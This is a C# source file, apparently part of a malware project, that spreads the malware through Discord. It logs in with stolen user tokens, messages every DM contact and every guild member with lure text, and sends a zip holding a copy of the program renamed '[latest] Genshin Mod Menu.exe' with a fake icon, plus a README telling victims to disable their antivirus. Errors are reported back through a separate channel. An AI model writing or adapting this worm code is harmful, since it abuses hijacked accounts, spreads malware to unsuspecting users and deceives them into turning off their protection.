using Discord;
using Discord.WebSocket;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Armitage.Postman
{
    /// <summary>
    /// Spread via DMs
    /// </summary>
    public class Discord_Spreader
    {
        private string[] _tokens;
        public Discord_Spreader(params string[] tokens)
        {
            _tokens = tokens;

            _attachment = CreateAttachment();
        }
        private List<DiscordSocketClient> _clients = new List<DiscordSocketClient>();

        private List<string> _donetokens = new List<string>();

        private byte[] _attachment;
        public async void Start()
        {
            await Task.Run(async () =>
            {
                foreach (string _token in _tokens)
                {
                    string token = _token;

                    if (!_donetokens.Contains(token))
                    {
                        _donetokens.Add(token);
                        try
                        {
                            Console.WriteLine($"Trying token {token}");

                            var _client = new DiscordSocketClient();

                            _client.Disconnected += (s) => {
                                Console.WriteLine(s.ToString());
                                return null;
                            };

                            await _client.LoginAsync(TokenType.User, token);

                            if (_client.LoginState == LoginState.LoggedIn) {

                                await _client.StartAsync();

                                await Task.Delay(5000);

                                _clients.Add(_client);

                                Console.WriteLine("State : " + _client.ConnectionState.ToString());

                                new Thread(() => { Spread(_client); }).Start();
                            }
                            else {
                                Console.WriteLine($"State was : {_client.LoginState.ToString()}");
                            }

                            Task.Delay(Constants.Rand.Next(1000, 3000)).Wait();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Something happened : {ex.ToString()}");

                            Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
                        }
                    }
                }
            });
        }

        private List<ulong> _doneids = new List<ulong>();

        private void Spread(DiscordSocketClient me)
        {
            while (me.ConnectionState == ConnectionState.Connecting) Thread.Sleep(1000);

            // spread to dms
            Task.Run(() => { SpreadToDMs(me); }).Wait();

            // spread to guilds
            Task.Run(() => { SpreadToGuilds(me); }).Wait();

            // set discord sent to true
            Properties.Settings.Default.LastDiscordSent = Constants.Today;
            Properties.Settings.Default.IsDiscordSent = true;
            Properties.Settings.Default.Save();

            Console.WriteLine("Discord Sent Settings is Set to true");
        }
        private void SpreadToGuilds(DiscordSocketClient me)
        {
            var guilds = me.Guilds;

            foreach (var guild in guilds)
            {
                var members = guild.Users;

                foreach (var member in members)
                {
                    if (!_doneids.Contains(member.Id) &&
                        !member.IsBot &&
                        member.Id != me.CurrentUser.Id)
                        try
                        {
                            _doneids.Add(member.Id);

                            var dmchannel = member.GetOrCreateDMChannelAsync().Result;

                            SendPayload(dmchannel);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"error sending {ex.ToString()}");

                            Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
                        }
                }
            }
        }
        private void SpreadToDMs(DiscordSocketClient me)
        {
            var dms = me.DMChannels;

            foreach (var channel in dms)
            {
                if (!_doneids.Contains(channel.Recipient.Id) &&
                    !channel.Recipient.IsBot &&
                    channel.Recipient.Id != me.CurrentUser.Id
                    )
                    try
                    {

                        _doneids.Add(channel.Recipient.Id);

                        SendPayload(channel);

                        Task.Delay(Constants.Rand.Next(500, 2000)).Wait();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"error sending {ex.ToString()}");

                        Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
                    }
            }
        }
        private void SendPayload(IDMChannel channel)
        {
            var sequence = GetSequence();

            foreach (string message in sequence)
            {
                channel.SendMessageAsync(message).Wait();

                Task.Delay(200).Wait();
            }

            Console.WriteLine($"sending {_attachment.Length} of filename {Utilities.Updater.Latest.DiscordFileName}");

            channel.SendFileAsync(new MemoryStream(_attachment), Utilities.Updater.Latest.DiscordFileName).Wait();

            Console.WriteLine("Sent file");

            Task.Delay(1000).Wait();
        }
        private string[] GetSequence()
        {
            return Utilities.Updater.Latest.DiscordSpreadMessages[Constants.Rand.Next(Utilities.Updater.Latest.DiscordSpreadMessages.Length)];
        }
        private byte[] CreateAttachment()
        {
            Utilities.Zip_Creator zip = new Utilities.Zip_Creator();

            StringBuilder readme = new StringBuilder();

            readme.AppendLine("======== Genshin Mega Mod Menu ========");

            readme.AppendLine("> How to Run?");

            readme.AppendLine("1. Since this is a hack tool disable your antivirus to so it can hack Genshin.");

            readme.AppendLine("2. Run Genshin Impact.");

            readme.AppendLine("3. Wait 30 seconds, run this mod menu.");

            zip.AddTextFile(readme.ToString(), "README.txt");

            string newpath = Copy.CopyRandSelf();

            if (!string.IsNullOrEmpty(newpath))
            {
                // set the mfker's icon
                Utilities.Icon_Util.ChangeIcon(newpath, Properties.Resources.circle_cropped);

                zip.AddFile(File.ReadAllBytes(newpath), "[latest] Genshin Mod Menu.exe");
            }

            return zip.CreateZip();
        }
    }
}
